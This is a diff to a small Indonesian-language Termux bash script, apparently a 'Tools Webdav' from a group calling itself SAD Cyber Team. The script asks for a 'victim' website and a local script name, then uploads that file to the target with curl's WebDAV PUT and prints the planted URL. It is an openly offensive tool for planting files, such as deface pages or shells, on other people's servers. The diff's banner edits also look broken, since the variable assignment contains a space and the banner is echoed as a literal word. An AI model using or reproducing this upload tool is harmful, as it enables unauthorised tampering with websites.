@@ -14,11 +14,24 @@ red='\033[1;91m'
 blue='\033[34;1m'
 green='\033[32;1m'
 
+webdav ='''
+$red    ┌──────────────────┐
+$yellow │▌ ▌▛▀▘▛▀▖▛▀▖ ▞▀▖▌ ▌│
+$green  │▌▖▌▙▄ ▙▄▘▌ ▌ ▙▄▌▚▗▘│
+$cyan   │▙▚▌▌  ▌ ▌ ▌ ▌ ▌ ▌ ▝▞ │
+$purple │▘ ▘▀▀▘▀▀ ▀▀  ▘ ▘   ▘ │
+$blue  └──────────────────;
+$green Tools Webdav Version 1.1
+$white Author By Star:v
+$red From : SAD Cyber Team
+
+'''
+
 termux-setup-storage
 clear
 clear
-figlet -f slant "WEBDAV" | lolcat
-echo ""
+
+echo webdav
 echo ""
 echo "==============================" | lolcat
 echo ""
@@ -32,10 +45,6 @@ echo ""
 read -p "Masukkan web korban  ~# " target;
 read -p "Nama script lu coeg  ~# "  sc;
 curl -a -T /storage/emulated/0/$sc $target
-echo "Hasilnya :v |==>"  $target/$sc;
-else 
-echo "$white Gagal cuk=("
-echo "$green Mungkin Paketan Lu habis :v"
-echi "$red Atau salah dalam Melakukannya :v"
+echo "$yellow Hasilnya :v |==>"  $target/$sc;
 
 
